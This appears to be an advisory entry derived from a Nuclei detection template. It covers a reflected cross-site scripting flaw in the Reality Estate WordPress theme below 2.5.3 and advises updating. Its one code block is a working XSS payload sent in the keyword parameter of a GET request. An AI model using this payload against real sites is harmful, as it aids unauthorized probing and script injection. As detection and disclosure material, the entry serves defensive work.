# Vulnerability: Reality Estate Multipurpose WP-Theme < 2.5.3 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-reality-estate-theme.yaml`)

## Description
Reflected XSS was discovered in the 'Reality | Estate Multipurpose WordPress Theme'.

## Secure Mitigation
update to v.2.5.3

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22
```

